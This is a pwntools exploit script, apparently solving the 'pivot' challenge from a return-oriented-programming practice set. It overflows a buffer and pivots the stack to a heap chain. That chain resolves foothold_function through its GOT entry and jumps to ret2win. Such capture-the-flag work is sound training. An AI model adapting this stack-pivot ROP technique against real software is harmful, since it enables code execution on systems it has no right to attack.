from pwn import *

exe = context.binary = ELF("./pivot",checksec=False)
context.log_level = 'debug'
pty = process.PTY

offset = 40

foothold_plt = 0x400850
foothold_got = 0x602048
ret2win_offset = 0x14e
# 0x400b00: pop rax; ret;
pop_rax = 0x400b00
# 0x400b02: xchg rax, rsp; ret;
xchg_rax_rsp = 0x400b02
# 0x400b05: mov rax, qword ptr [rax]; ret;
mov_rax_ptr_rax = 0x400b05
# 0x400900: pop rbp; ret;
pop_rbp = 0x400900
# 0x400b09: add rax, rbp; ret;
add_rax_rbp = 0x400b09
# 0x40098e: call rax;
call_rax = 0x40098e

heap_payload = flat(
    foothold_plt,
    pop_rax,
    foothold_got,
    mov_rax_ptr_rax,
    pop_rbp,
    ret2win_offset,
    add_rax_rbp,
    call_rax
)

p = process(stdin=PTY,stdout=PTY)
# p.clean()
# pivot_addr = int(p.recvuntil('pivot: ').strip(),16)
p.recvuntil("pivot: ")
pivot_addr = int(p.recvuntil("\n").strip(), 16)
print(hex(pivot_addr))
# pivot_addr = int(re.search(r"(0x[\w\d]+)", p.recvS()).group(0), 16)


p.sendline(heap_payload)

stack_smash_and_pivot = flat(
    asm('nop') * offset,
    pop_rax,
    pivot_addr,
    xchg_rax_rsp
)
# p.sendlineafter('>', stack_smash_and_pivot)
# p.recvuntil("Now please send your stack smash")
p.recvuntil('>')
p.sendline(stack_smash_and_pivot)
p.interactive()
# p.sendlineafter('>', stack_smash)
# p.recvlines(2)
# leaked_got_addr = p.recv()
# foothold_leaked = unpack(leaked_got_addr[:4].strip())
